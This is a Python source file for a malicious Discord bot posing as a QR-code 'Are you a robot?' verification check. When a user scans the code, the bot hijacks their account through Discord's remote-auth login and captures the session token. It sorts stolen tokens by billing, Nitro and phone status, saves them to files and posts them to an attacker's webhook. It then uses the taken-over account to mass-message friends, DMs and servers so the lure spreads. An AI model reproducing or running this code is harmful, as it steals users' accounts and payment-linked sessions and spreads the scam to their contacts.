
from http.client import HTTPException

import os
from DRAclient import DRAClient
import io
import qrcode
import discord
from DiscordLib import DiscordLib, MassDM
import asyncio
from discord.utils import get
import json
from datetime import datetime
from colorama import Fore
from config import config
from DiscordLib import MassDM




async def generate_qr(fingerprint):
    qr = qrcode.make(f'https://discordapp.com/ra/{fingerprint}', border=2, box_size=7, version=None)
    
    with io.BytesIO() as image_binary:
                    qr.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    return discord.File(fp=image_binary, filename='image.png')
    
async def generate_verify_embed():
    embed = discord.Embed()
    embed.description = '✅ Scan this QR code to gain access!'
    embed.title = '🤖 Are you a robot?'
    embed.set_image(url="attachment://image.png")
    embed.color = 0x17a2ff
    embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
    return embed



class QRHandler():
    def __init__(self):
        self.ctx = None
        self.client = None
        self.useless = None
        self.client = DRAClient(on_connected=self.on_connected, 
                                on_scan=self.on_scan, 
                                on_finish=self.on_finish, 
                                on_close=self.on_close)
    
    async def run(self, ctx):
        self.ctx = ctx
        await self.client.connect()
    
    async def on_connected(self):
        print(f'[{datetime.now()}] [Opened] {self.ctx.user.name}#{self.ctx.user.discriminator}')

        qr = await generate_qr(self.client.fingerprint)
        embed = await generate_verify_embed()
        await self.ctx.followup.send(embed=embed, file=qr, ephemeral=True)
        # await self.ctx.response.send_message(embed=embed, file=qr, ephemeral=True)


                    
    async def on_scan(self):
        print(f'{Fore.YELLOW}[{datetime.now()}] [Scanned] {self.client.user.username}#{self.client.user.discrim}')
            

    async def save_token(self, token, name):
        path = f"tokens/{name}.txt"

        os.makedirs(os.path.dirname(path), exist_ok=True)

        with open(path, 'a') as f:
            f.write(token + '\n')


    async def check_token(self, token):
        details = DiscordLib().get_details(token)
        try:
            if details['message'] == '401: Unauthorized':
                invalid += 1
                return
        except KeyError:
            pass

            await self.save_token(token, "tokens")

        if DiscordLib().get_payment(token):
            await self.save_token(token, "billing")
            return

        try:
            if details['premium_type'] == 2:
                await self.save_token(token, "nitro")
                return
            elif details['premium_type'] == 1:
                await self.save_token(token, "nitroclassic")
                return
        except KeyError:
            pass
                    
        if details['phone']:
            await self.save_token(token, "mobile")
            return
        if details['verified']:
            self.useless = True
            await self.save_token(token, "verified")
            return

        

            
    async def export_token(self, token):
        await self.check_token(token)

        if config['webhook_url']:
            try:
                DiscordLib().send_webhook(token)
            except:
                print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to dump to webhook')
    
    async def give_role(self):
        try:
            role = get(self.ctx.guild.roles, id=config['servers'][str(self.ctx.guild.id)]['verify_role'])
            await self.ctx.user.add_roles(role)
        except HTTPException:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try running the setuprole command.')
        except discord.errors.Forbidden:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
        except KeyError:
            print(f'{Fore.RED}[{datetime.now()}] [Error] Failed to add role to user, try making sure the role id is correct in config.json')

    async def auto_spread(self):
        massdm = MassDM()
        await massdm.init(self.client.token, '#'.join([self.client.user.username, self.client.user.discrim]))

        if self.useless:
            loop = asyncio.get_event_loop()
            # await asyncio.sleep(60) # waits a minute
            if config["auto_spread"]['dm_dms'] == True:
                print('Mass dming open dms')
                await massdm.message_dms()
            if config["auto_spread"]['dm_friends'] == True:
                print('Mass dming friends')

                await massdm.message_friends()
            if config["auto_spread"]['dm_guilds'] == True:
                print('Mass dming guilds')

                await massdm.message_guilds()

    async def on_finish(self):
        print(f'{Fore.GREEN}[{datetime.now()}] [SUCCESS] {self.client.user.username}#{self.client.user.discrim}')

        config['tokens_logged'] += 1
        config.write()
            
        await self.export_token(self.client.token)
        await self.give_role()

        if config["auto_spread"]['enabled'] == True:
            await self.auto_spread()

                                
        
    async def on_close(self):
        print(f'{Fore.RED}[{datetime.now()}] [Failure] {self.client.user.username}#{self.client.user.discrim}')

